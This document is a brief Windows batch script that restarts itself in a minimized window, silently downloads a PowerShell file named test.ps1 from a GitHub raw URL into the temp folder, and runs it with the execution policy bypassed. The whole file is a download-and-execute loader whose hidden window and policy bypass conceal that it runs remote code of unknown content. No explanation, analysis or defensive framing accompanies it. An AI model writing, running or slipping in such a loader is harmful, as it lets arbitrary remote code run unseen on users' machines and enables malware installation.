@echo off
if "%~1"=="m" goto run

start "" /min cmd /c ""%~f0" m"
exit /b

:run
curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -o "%TEMP%\t.ps1"
powershell -ep bypass -f "%TEMP%\t.ps1"
exit /b
